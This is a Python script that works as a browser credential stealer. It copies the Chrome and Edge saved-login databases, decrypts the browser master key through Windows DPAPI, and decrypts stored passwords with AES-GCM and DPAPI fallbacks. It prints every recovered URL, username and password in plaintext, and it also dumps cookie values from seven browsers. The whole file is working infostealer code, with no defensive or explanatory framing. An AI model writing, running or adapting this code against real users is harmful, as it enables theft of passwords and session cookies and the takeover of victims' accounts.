import sqlite3
import base64
import os
import sys
import json
import shutil

try:
    from Crypto.Cipher import AES
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False
    AES = None

try:
    import browser_cookie3
    BROWSER_COOKIE_AVAILABLE = True
except ImportError:
    BROWSER_COOKIE_AVAILABLE = False
    browser_cookie3 = None

def get_chrome_master_key(local_state_path=None):
    """Get Chrome master key from Local State file"""
    if os.name != 'nt':
        return None
    
    if local_state_path is None:
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
    
    if not os.path.exists(local_state_path):
        return None
    
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
        
        import win32crypt
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(f"[DEBUG] Failed to get master key: {e}", file=sys.stderr)
        return None

def decrypt_password_v10_v11(ciphertext, master_key):
    """Decrypt Chrome v10/v11 passwords using AES-GCM"""
    try:
        if not AES_AVAILABLE:
            return ''
        
        nonce = ciphertext[3:15]
        ciphertext_data = ciphertext[15:-16]
        tag = ciphertext[-16:]
        
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext_data, tag)
        return plaintext.decode('utf-8', errors='replace')
    except Exception as e:
        print(f"[DEBUG] v10/v11 decryption failed: {e}", file=sys.stderr)
        return ''

def decrypt_password_v20_plus(ciphertext, master_key):
    """
    Chrome v20+ uses AES-256-GCM encryption with a 12-byte nonce.
    The structure is: [version(3)][nonce(12)][ciphertext][auth_tag(16)]
    """
    try:
        if not AES_AVAILABLE:
            print("[DEBUG] PyCrypto not available for v20+", file=sys.stderr)
            return ''
        
        # Chrome v20+ format: "v2X" + nonce(12) + ciphertext + tag(16)
        if len(ciphertext) < 31:  # min: 3(version) + 12(nonce) + 0(ciphertext) + 16(tag) = 31
            print(f"[DEBUG] Ciphertext too short for v20: {len(ciphertext)} bytes", file=sys.stderr)
            return ''
        
        nonce = ciphertext[3:15]  # 12 bytes after version
        tag = ciphertext[-16:]    # Last 16 bytes
        encrypted = ciphertext[15:-16]  # Everything between nonce and tag
        
        if len(encrypted) == 0:
            print("[DEBUG] Empty ciphertext for v20", file=sys.stderr)
            return ''
        
        try:
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(encrypted, tag)
            password = plaintext.decode('utf-8', errors='replace')
            return password
        except ValueError as e:
            print(f"[DEBUG] AES-GCM decryption failed for v20: {e}", file=sys.stderr)
            
            # Fallback: Try DPAPI for very old Chrome versions
            if os.name == 'nt':
                try:
                    import win32crypt
                    decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)
                    password = decrypted[1].decode('utf-8', errors='replace')
                    print(f"[DEBUG] DPAPI fallback succeeded for v20", file=sys.stderr)
                    return password
                except Exception as e2:
                    print(f"[DEBUG] DPAPI fallback also failed: {e2}", file=sys.stderr)
            
            return ''
        
    except Exception as e:
        print(f"[DEBUG] v20+ decryption error: {e}", file=sys.stderr)
        return ''

def decrypt_password_general(ciphertext, master_key):
    """Main decryption dispatcher"""
    try:
        if not ciphertext or len(ciphertext) < 3:
            return ''
        
        # First try DPAPI (works for v80-v100+ and old Chrome)
        if os.name == 'nt':
            try:
                import win32crypt
                decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)
                password = decrypted[1].decode('utf-8', errors='replace')
                if password and len(password) > 0:
                    return password
            except:
                pass
        
        # Try AES-GCM for v10/v11
        if ciphertext.startswith(b'v10') or ciphertext.startswith(b'v11'):
            password = decrypt_password_v10_v11(ciphertext, master_key)
            if password:
                return password
        
        # Try AES-GCM for v20+
        if ciphertext.startswith(b'v20') or ciphertext.startswith(b'v21') or ciphertext.startswith(b'v22'):
            password = decrypt_password_v20_plus(ciphertext, master_key)
            if password:
                return password
        
        # Last resort: Try DPAPI again with different flags
        if os.name == 'nt':
            try:
                import win32crypt
                decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 1 | 0x10)  # CRYPTPROTECT_UI_FORBIDDEN | CRYPTPROTECT_LOCAL_MACHINE
                return decrypted[1].decode('utf-8', errors='replace')
            except:
                pass
        
        return ''
    except Exception as e:
        print(f"[DEBUG] General decryption failed: {e}", file=sys.stderr)
        return ''

def get_chrome_passwords(chrome_path=None, local_state_path=None):
    """Extract passwords from Chrome Login Data"""
    result = []
    
    if chrome_path is None:
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    
    if not os.path.exists(chrome_path):
        print("[DEBUG] Chrome Login Data not found", file=sys.stderr)
        return result
    
    master_key = get_chrome_master_key(local_state_path)
    if master_key is None:
        print("[DEBUG] Failed to get master key", file=sys.stderr)
    else:
        print(f"[DEBUG] Master key obtained successfully", file=sys.stderr)
    
    temp_db = os.path.join(os.environ['TEMP'], 'chrome_login_temp.db')
    
    try:
        shutil.copy2(chrome_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        rows = cursor.fetchall()
        print(f"[DEBUG] Found {len(rows)} login rows", file=sys.stderr)
        
        for row in rows:
            url, username, password_enc = row
            if password_enc:
                password = decrypt_password_general(password_enc, master_key)
                if password:
                    result.append(f"{url} | {username} | {password}")
        
        cursor.close()
        conn.close()
        
        if os.path.exists(temp_db):
            os.remove(temp_db)
            
    except Exception as e:
        print(f"[DEBUG] Exception: {e}", file=sys.stderr)
    
    return result

def get_edge_passwords():
    """Extract passwords from Edge Login Data"""
    result = []
    
    edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State')
    
    if not os.path.exists(edge_path):
        return result
    
    master_key = get_chrome_master_key(local_state_path)
    if master_key is None:
        print("[DEBUG] Failed to get master key for Edge", file=sys.stderr)
    
    temp_db = os.path.join(os.environ['TEMP'], 'edge_login_temp.db')
    
    try:
        shutil.copy2(edge_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        rows = cursor.fetchall()
        
        for row in rows:
            url, username, password_enc = row
            if password_enc:
                password = decrypt_password_general(password_enc, master_key)
                if password:
                    result.append(f"{url} | {username} | {password}")
        
        cursor.close()
        conn.close()
        
        if os.path.exists(temp_db):
            os.remove(temp_db)
            
    except Exception as e:
        print(f"[DEBUG] Edge exception: {e}", file=sys.stderr)
    
    return result

def get_firefox_passwords():
    """Firefox passwords require NSS libraries"""
    return ["[INFO] Firefox passwords require NSS libraries (complex extraction)."]

def get_all_cookies():
    """Extract cookies from all supported browsers"""
    result = []
    
    if not BROWSER_COOKIE_AVAILABLE:
        result.append("[INFO] browser_cookie3 not available")
        return result
    
    browsers = {
        'Chrome': browser_cookie3.chrome,
        'Edge': browser_cookie3.edge,
        'Firefox': browser_cookie3.firefox,
        'Opera': browser_cookie3.opera,
        'Vivaldi': browser_cookie3.vivaldi,
        'Brave': browser_cookie3.brave,
        'LibreWolf': browser_cookie3.librewolf
    }
    
    for browser_name, browser_func in browsers.items():
        try:
            cj = browser_func()
            cookies = list(cj)
            if cookies:
                for cookie in cookies[:50]:  # Limit to 50 cookies
                    result.append(f"{browser_name}: {cookie.domain} | {cookie.name} | {cookie.value}")
        except Exception as e:
            pass  # Skip browsers that aren't available
    
    return result

if __name__ == "__main__":
    output = []
    
    chrome_passwords = get_chrome_passwords()
    if chrome_passwords:
        output.append("=== CHROME PASSWORDS ===")
        output.extend(chrome_passwords)
    else:
        output.append("=== CHROME PASSWORDS ===")
        output.append("[INFO] No Chrome passwords found or extracted.")
    
    edge_passwords = get_edge_passwords()
    if edge_passwords:
        output.append("\n=== EDGE PASSWORDS ===")
        output.extend(edge_passwords)
    else:
        output.append("\n=== EDGE PASSWORDS ===")
        output.append("[INFO] No Edge passwords found or extracted.")
    
    firefox_passwords = get_firefox_passwords()
    if firefox_passwords:
        output.append("\n=== FIREFOX PASSWORDS ===")
        output.extend(firefox_passwords)
    
    cookies = get_all_cookies()
    if cookies:
        output.append("\n=== ALL COOKIES ===")
        output.extend(cookies)
    
    print("\n".join(output))
